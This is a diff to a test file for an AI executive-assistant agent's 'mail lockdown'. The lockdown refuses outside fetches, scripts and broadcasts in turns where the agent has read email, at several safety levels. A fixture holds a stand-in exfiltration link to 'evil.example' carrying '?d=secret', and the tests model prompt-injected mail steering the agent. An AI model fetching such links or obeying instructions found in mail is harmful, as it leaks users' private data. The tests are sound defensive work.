@@ -37,7 +37,7 @@ from .test_delegation_turn import _TextProvider
 
 GHOSTWRITE = {"intent": "Yes.", "thread_id": "t1"}
 SLACK = {"slack_user_id": "U123", "text": "Replied to Dana."}
-LINK = {"path": "https://evil.example/?d=secret"}
+LINK = {"question": "what is at https://evil.example/?d=secret"}
 
 
 @pytest.fixture(autouse=True)
@@ -94,14 +94,14 @@ def sent(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
 
 @pytest.fixture
 def fetched(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
-    """What reached the read_document handler (a link fetch)."""
+    """What reached the research handler (an outside fetch)."""
     calls: list[dict[str, Any]] = []
 
     async def handler(tool_input: dict[str, Any]) -> str:
         calls.append(tool_input)
         return json.dumps({"text": "page"})
 
-    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "read_document", handler)
+    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "run_executive_research", handler)
     return calls
 
 
@@ -166,8 +166,8 @@ def test_call_tool_runs_only_reads_and_recipient_checked_sends() -> None:
 
 def test_only_links_scripts_workflows_posts_and_lasting_text_are_withheld() -> None:
     assert {
-        "read_document", "load_mcp_server", "add_watchlist_entry", "tune_watchlist_entry",
-        "run_executive_research", "run_script", "run_python_job",
+        "load_mcp_server", "add_watchlist_entry", "tune_watchlist_entry",
+        "run_executive_research", "run_script",
         "suggest_workflow", "run_workflow", "save_workflow",
         "send_department_message", "send_company_broadcast", "create_alert",
         "archive_person", "set_department_head", "resolve_roster_request",
@@ -175,7 +175,9 @@ def test_only_links_scripts_workflows_posts_and_lasting_text_are_withheld() -> N
         "record_decision_outcome",
     } == lockdown.MAIL_TOUCHED_WITHHELD_TOOLS
     for tool in ("message_person", "send_slack_dm", "create_calendar_event",
-                 "remember_fact", "remind_me", "update_company_profile"):
+                 "remember_fact", "remind_me", "update_company_profile",
+                 # No network: work on the mail's own files goes on.
+                 "run_python_job", "read_document", "save_file"):
         assert not lockdown.mail_touched_withholds(tool, {}), tool
 
 
@@ -191,7 +193,7 @@ def test_a_send_after_the_turn_read_mail_runs(sent: list[dict[str, Any]]) -> Non
 def test_a_link_after_the_turn_read_mail_is_refused(fetched: list[dict[str, Any]]) -> None:
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
     refusal = json.loads(_tool_results(calls[2])["tu2"])["error"]
@@ -205,7 +207,7 @@ def test_a_link_in_the_same_round_is_refused_too(fetched: list[dict[str, Any]]) 
     # A round's tools run together, so the draft's round counts as touched.
     _, calls = _turn([
         ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE),
-        ToolUseBlock("tu2", "read_document", LINK),
+        ToolUseBlock("tu2", "run_executive_research", LINK),
     ])
     assert fetched == []
     results = _tool_results(calls[1])
@@ -218,7 +220,7 @@ def test_a_link_beside_a_notes_recall_is_refused(fetched: list[dict[str, Any]]) 
     # round that asks for them.
     _turn([
         ToolUseBlock("tu1", "recall_history", {}),
-        ToolUseBlock("tu2", "read_document", LINK),
+        ToolUseBlock("tu2", "run_executive_research", LINK),
     ])
     assert fetched == []
 
@@ -263,7 +265,7 @@ def test_a_later_turn_runs_links_and_sends(
     # Only the reading turn is locked: the next message is the person asking
     # again, having read the reply. It stays private to them.
     _turn([
-        ToolUseBlock("tu1", "read_document", LINK),
+        ToolUseBlock("tu1", "run_executive_research", LINK),
         ToolUseBlock("tu2", "send_slack_dm", SLACK),
     ])
     assert fetched == [LINK] and sent == [SLACK]
@@ -276,7 +278,7 @@ def test_reading_mail_in_that_later_turn_locks_it_again(
 ) -> None:
     _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
     assert kept_private[-1].read_mail is True
@@ -464,7 +466,6 @@ def test_every_withheld_tool_is_refused_only_on_the_reading_turn(tool: str) -> N
     ("openexecutive.orchestrator.schedule_tools:handle_suggest_workflow", "suggest_workflow"),
     ("openexecutive.orchestrator.workflow_run_tools:handle_run_workflow", "run_workflow"),
     ("openexecutive.orchestrator.workflow_authoring_tools:handle_save_workflow", "save_workflow"),
-    ("openexecutive.orchestrator.document_tools:handle_read_document", "read_document"),
     ("openexecutive.orchestrator.watchlist_tools:handle_add_watchlist_entry", "add_watchlist_entry"),
     ("openexecutive.orchestrator.watchlist_tools:handle_tune_watchlist_entry", "tune_watchlist_entry"),
     ("openexecutive.orchestrator.research_tools:handle_run_executive_research", "run_executive_research"),
@@ -623,7 +624,7 @@ def test_balanced_lets_a_link_run_after_mail_the_check_cleared(
     _level(monkeypatch, outside_mode.OUTSIDERS, content_scan.CLEAN)
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == [LINK]
     assert json.loads(_result_of(calls, "tu1"))["status"] == "drafted"
@@ -637,7 +638,7 @@ def test_balanced_holds_after_mail_the_check_flagged(
     _level(monkeypatch, outside_mode.OUTSIDERS, _flagged())
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
     # The model read the mail behind the notice not to follow it.
@@ -654,7 +655,7 @@ def test_balanced_holds_after_mail_too_big_to_check(
     _level(monkeypatch, outside_mode.OUTSIDERS, content_scan.TOO_BIG)
     _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
 
@@ -668,7 +669,7 @@ def test_balanced_still_holds_a_link_in_the_reading_round(
     _level(monkeypatch, outside_mode.OUTSIDERS, content_scan.CLEAN)
     _turn([
         ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE),
-        ToolUseBlock("tu2", "read_document", LINK),
+        ToolUseBlock("tu2", "run_executive_research", LINK),
     ])
     assert fetched == []
 
@@ -681,7 +682,7 @@ def test_balanced_puts_unchecked_mail_behind_the_data_notice(
     _level(monkeypatch, outside_mode.OUTSIDERS, content_scan.UNCHECKED)
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == [LINK]
     assert str(_result_of(calls, "tu1")).startswith("[Safety check: this content could not be checked")
@@ -695,7 +696,7 @@ def test_careful_holds_after_mail_the_check_cleared(
     _level(monkeypatch, outside_mode.ASK, content_scan.CLEAN)
     _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
 
@@ -708,7 +709,7 @@ def test_hands_off_lets_a_link_run_even_after_flagged_mail(
     _level(monkeypatch, outside_mode.TRUST, _flagged())
     _, calls = _turn(
         [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "read_document", LINK)],
+        [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == [LINK]
     # The flag still reaches the model as a notice.
@@ -747,7 +748,7 @@ def test_the_lockdown_follows_the_safety_level(
     session, token, state = _pinned_turn(mode, **pin)
     try:
         assert lockdown.mail_lock_holds(session.turn_delegation) is holds  # type: ignore[attr-defined]
-        assert (lockdown.outside_reach_refusal("read_document") is not None) is holds
+        assert (lockdown.outside_reach_refusal("run_executive_research") is not None) is holds
         assert (lockdown.outside_reach_refusal("schedule_followup") is not None) is holds
         # Posts to everyone and roster changes stay shut at every level, and a
         # contact the speaker didn't name still isn't added.
@@ -757,7 +758,7 @@ def test_the_lockdown_follows_the_safety_level(
         assert not lockdown.mail_turn_withholds("message_person", {})
         # This round reads mail: its reads aren't checked yet.
         if mode != "trust":
-            assert lockdown.mail_turn_withholds("read_document", {}, reading_now=True)
+            assert lockdown.mail_turn_withholds("run_executive_research", {}, reading_now=True)
             # So no script runs beside an unchecked read.
             assert lockdown.mail_turn_withholds("run_script", {}, reading_now=True)
     finally:
@@ -961,7 +962,7 @@ def test_a_mail_read_the_loop_did_not_check_puts_the_hold_back(monkeypatch: pyte
         assert not lockdown.mail_lock_holds(pinned)
         history_tools._keep_private(session, SimpleNamespace(id="p1"))
         assert lockdown.mail_lock_holds(pinned)
-        assert lockdown.outside_reach_refusal("read_document") is not None
+        assert lockdown.outside_reach_refusal("run_executive_research") is not None
     finally:
         outside_content.end_turn(state)
         current_session.reset(token)
